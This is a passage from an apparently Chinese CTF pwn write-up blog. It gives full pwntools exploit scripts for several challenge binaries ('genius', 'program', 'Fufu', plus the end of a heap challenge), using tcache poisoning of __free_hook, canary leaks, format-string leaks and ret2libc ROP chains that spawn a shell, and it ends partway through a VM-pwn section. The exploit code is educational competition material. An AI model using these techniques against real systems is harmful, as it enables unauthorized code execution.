coordinate:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Quantum essence required:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Cursed sanctum to cleanse:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Sanctum for arcane inscription:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Runic sequence length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Inscribe your primordial truth:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Sanctum to reveal cosmic truth:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base = l64() - <span class="number">0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##leak heap</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">heap = p.recv(<span class="number">6</span>)</span><br><span class="line">heap_addr = u64(heap.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;heap_addr&#x27;</span>,heap_addr)</span><br><span class="line">top_chunk = heap_addr + <span class="number">0x50</span></span><br><span class="line">lg(<span class="string">&#x27;top_chunk&#x27;</span>,top_chunk)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">one = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">og = libc_base + one[<span class="number">2</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">lg(<span class="string">&#x27;og&#x27;</span>,og)</span><br><span class="line"><span class="comment">## tcache_poisoning</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x10</span>,p64(og))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="genius"><a href="#genius" class="headerlink" title="genius"></a>genius</h2><p>function3()中栈溢出</p>
<p>思路：</p>
<ul>
<li>绕过没用的东西</li>
<li>进入function3()，read()中读入覆盖canary的低字节，printf()泄露出来</li>
<li>gets()溢出，rop</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># time: 2025-05-10 09:23:13</span></span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">terminal</span> =</span> [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="meta"># libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(p,gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span></span><br><span class="line"><span class="meta"># b *0x000000000040120F</span></span><br><span class="line"># <span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(data)</span><br><span class="line">sa      = lambda delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = lambda                    :p.recvline()</span><br><span class="line">ru      = lambda delims             :p.recvuntil(delims)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">leak    = lambda name, addr         :<span class="built_in">log</span>.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.format(name, addr))</span><br><span class="line">hs256   = lambda data               :sha256(str(data).encode()).hexdigest()</span><br><span class="line">l32     = lambda                    :u32(p.recvuntil(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = lambda                    :u64(p.recvuntil(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = lambda                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">int16   = lambda data               :<span class="type">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;,yes or no?&quot;</span>,b<span class="string">&quot;no&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;don&#x27;t be so modest.&quot;</span>,b<span class="string">&quot;thanks&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(b<span class="string">&quot;what you want in init&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">0x16</span> + b<span class="string">&quot;bb&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(b<span class="string">&quot;bb\n&quot;</span>)</span><br><span class="line">canary = uu64(r(<span class="number">7</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x401050</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0</span>) +p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">sla(b<span class="string">&quot;thank you&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="program"><a href="#program" class="headerlink" title="program"></a>program</h2><p>glibc2.31 </p>
<p>uaf，堆溢出，增删改查都有</p>
<p>思路：</p>
<ul>
<li>先free一个chunk进入unsortedbin，泄露canary</li>
<li>tcache_poisoning申请到free_hook</li>
<li>改free_hook为system，free一个chunk即可get shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-10 09:50:26</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12300</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># gdbscript = &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;choice:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,data</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;length:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    sla(<span class="string">b&quot;content:&quot;</span>,data)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">libc_base = l64() - <span class="number">0x1ecbe0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">og = libc_base + one[<span class="number">1</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="Fufu"><a href="#Fufu" class="headerlink" title="Fufu"></a>Fufu</h2><p>保护全开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ctf @ 51e4c2a03f9c in ~/pwn [0:52:46]</span></span><br><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctf @ 51e4c2a03f9c in ~/pwn [0:52:51]</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>分析程序：</p>
<p>这道题给出了一个菜单，有两个函数，分析如下：</p>
<h3 id="submit-evidence"><a href="#submit-evidence" class="headerlink" title="submit_evidence()"></a>submit_evidence()</h3><p>ida中反编译的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">submit_evidence</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nbytes_4[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Furina: Time is limited! &gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * nbytes &lt;= <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furina: Present your evidence! &gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nbytes_4, nbytes);</span><br><span class="line">    <span class="built_in">printf</span>(nbytes_4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hcy want to eat chicken! &gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nbytes_4, nbytes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Furina: Mortal evidence should be concise!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有三次输入：</p>
<ul>
<li>第一次输入的时候，程序进行了判断 10*input &lt;&#x3D; 0x40 ,所以必须小于7</li>
<li>第二次输入，可以明显的发现是格式化字符串漏洞</li>
<li>第三次输入目前看来用处不大</li>
</ul>
<h3 id="trial-adjourned"><a href="#trial-adjourned" class="headerlink" title="trial_adjourned()"></a>trial_adjourned()</h3><p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">trial_adjourned</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Furina: The trial is adjourned&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的栈溢出</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先找一个gadgets，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fufu/ $ ROPgadget --binary ./pwn --only <span class="string">&quot;pop|ret&quot;</span>                                                       </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000001332 : pop r15 ; ret</span><br><span class="line">0x0000000000001183 : pop rbp ; ret</span><br><span class="line">0x000000000000132f : pop rdi ; ret &lt;=== 选择这个</span><br><span class="line">0x0000000000001331 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000000101a : ret  &lt;=== 和这个</span><br><span class="line">0x0000000000001219 : ret 0x8d48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>

<p>明确了有格式化字符串漏洞和栈溢出，并且前者可重复利用，fmt+ret2libc</p>
<p>思路：</p>
<ul>
<li>通过两次格式化字符串，来泄露canary和程序基址（此处泄露的main）</li>
<li>通过2中的栈溢出泄露地址，并在该<a href="libc.rip">网站</a>上查到system，bin_sh偏移</li>
<li>再让程序返回到输入这里，再次利用栈溢出来get_shell</li>
<li>注意：这道题glibc是2.34版本的，存在栈平衡检查，在调用system时要多加一个ret</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-13 10:16:52</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12600</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;? &gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line">sla(menu, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&quot;limited! &gt;&gt;&quot;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">data = <span class="string">b&quot;+%17$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;evidence! &gt;&gt; &quot;</span>,data)</span><br><span class="line">ru(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line">canary = int16(r(<span class="number">18</span>))</span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"><span class="comment"># sla(b&quot;chicken! &gt;&gt; &quot;,b&quot;d&quot;)</span></span><br><span class="line">sla(menu, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&quot;limited! &gt;&gt;&quot;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">data = <span class="string">b&quot;+%19$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;evidence! &gt;&gt; &quot;</span>,data)</span><br><span class="line">ru(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line">main_addr = int16(r(<span class="number">14</span>)) - <span class="number">0x9e</span></span><br><span class="line">leak(<span class="string">&quot;main_addr&quot;</span>,main_addr)</span><br><span class="line">base = main_addr - elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">leak(<span class="string">&quot;base&quot;</span>,base)</span><br><span class="line">sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000000132f</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000001331</span></span><br><span class="line">ret = <span class="number">0x000000000000101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(base + pop_rdi) + p64(base + elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(base +elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(base + elf.sym[<span class="string">&quot;trial_adjourned&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([b&quot;a&quot;*0x48,canary,b&quot;a&quot;*8,pop_rdi,elf.got[&#x27;puts&#x27;],elf.plt[&#x27;puts&#x27;],elf.sym[&quot;trial_adjourned&quot;]])</span></span><br><span class="line">sla(<span class="string">b&quot;is adjourned&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">read = l64()</span><br><span class="line">leak(<span class="string">&quot;read&quot;</span>,read)</span><br><span class="line"></span><br><span class="line">libc_base = read - 	<span class="number">0x1147d0</span></span><br><span class="line">system = libc_base + 	<span class="number">0x50d70</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1d8678</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(base + pop_rdi) + p64(bin_sh) + p64(base+ret) +p64(system)</span><br><span class="line">sla(<span class="string">b&quot;is adjourned&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="mutsumi"><a href="#mutsumi" class="headerlink" title="mutsumi"></a>mutsumi</h2><p>还是vmpwn</p>
<p>通过mutsumi_jit函数解析用户输入的指令生成机器码并通过run_vm执行</p>
<p>vm结构体，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struc_VM</span>&#123;</span></span><br><span class="line">    <span class="type">void</span>* target;</span><br><span class="line">	<span class="type">int</span> type;</span><br><span class="line">	<span class="type">int</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm结构体由 指针、指令类型、指令 组成，后续在mutsumi_jit()进行处理</p>
<p>在main()函数中首先分配了两个chunk，一个赋给了VM</p>
<p><img data-src="/../images/image-20250515165114832.png" alt="image-20250515165114832"></p>
<p>这里分配了0x1000+0x10大小的空间给VM，通过下图观察VM的结构体</p>
<p><img data-src="/../images/image-20250515165552825.png" alt="image-20250515165552825"></p>
<p>主程序中，程序接受的每次输入有三种形式：</p>
<ul>
<li>saki,ido,to name </li>
<li>saki,ido nptr </li>
<li>saki,stop</li>
</ul>
<p><img data-src="/../images/image-20250515165731915.png" alt="image-20250515165731915"></p>
<p>由于atoi(nptr)，我们不能自由的生成指令 程序使用__isoc99_scanf(“%s”, s);读入，没有对长度进行检查</p>
<p>观察上图，我们可以通过溢出修改vm结构体 来控制要生成的指令 构造payload &#x3D; b’saki,stop’.ljust(0x20,b’\x00’) + ( p64(target) + p64(type) + p64(value) ) *n</p>
<p>在mutsumi_jit中对vm结构体进行处理，先将指针的值和saki进行比较，再根据type进行跳转，当type&#x3D;&#x3D;0 时，会调用imm2asm将value转换为机器码存入0x114000</p>
<p><img data-src="/../images/image-20250515170659475.png" alt="image-20250515170659475"></p>
<p>思路：</p>
<ul>
<li>通过溢出，修改指令</li>
